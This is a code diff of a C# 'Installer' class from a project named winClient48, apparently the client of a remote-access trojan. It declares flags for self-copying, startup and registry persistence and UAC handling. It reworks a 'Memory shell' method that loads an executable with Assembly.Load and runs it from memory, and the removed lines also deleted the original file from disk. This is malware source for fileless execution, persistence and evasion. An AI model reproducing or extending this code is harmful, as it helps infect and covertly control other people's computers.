@@ -15,10 +15,13 @@ namespace winClient48
 {
     internal class Installer
     {
+        public string[] m_args { get; set; }
+
         public bool m_bCopyDir { get; set; }
         public bool m_bStartUp { get; set; }
         public bool m_bReg { get; set; }
         public bool m_bUAC { get; set; }
+        public bool m_bLoadToMemory { get; set; }
 
         public string m_szCurrentPath { get; set; }
         public string m_szCopyPath { get; set; }
@@ -112,27 +115,18 @@ namespace winClient48
         /// <summary>
         /// Memory shell
         /// </summary>
-        public void LoadToMemory()
+        public void fnLoadToMemory(byte[] abExeBytes)
         {
-            string szCurrentPath = Process.GetCurrentProcess().MainModule.FileName;
-            byte[] abExeBytes = File.ReadAllBytes(szCurrentPath);
+            MessageBox.Show("X");
 
-            Thread thd = new Thread(() =>
-            {
-                Assembly asm = Assembly.Load(abExeBytes);
-                MethodInfo entry = asm.EntryPoint;
+            Assembly loaded = Assembly.Load(abExeBytes);
+            MethodInfo entry = loaded.EntryPoint;
+            object instance = null;
+            if (!entry.IsStatic)
+                instance = loaded.CreateInstance(entry.Name);
 
-                if (entry != null)
-                {
-                    object[] objParam = entry.GetParameters().Length == 0 ? null : new object[] { new string[0] };
-                    entry.Invoke(null, objParam);
-                }
-            });
-            
-            thd.SetApartmentState(ApartmentState.STA);
-            thd.Start();
+            entry.Invoke(instance, new object[] { new string[] { "mem" } });
 
-            SelfDestroy(szCurrentPath);
             Environment.Exit(0);
         }
 
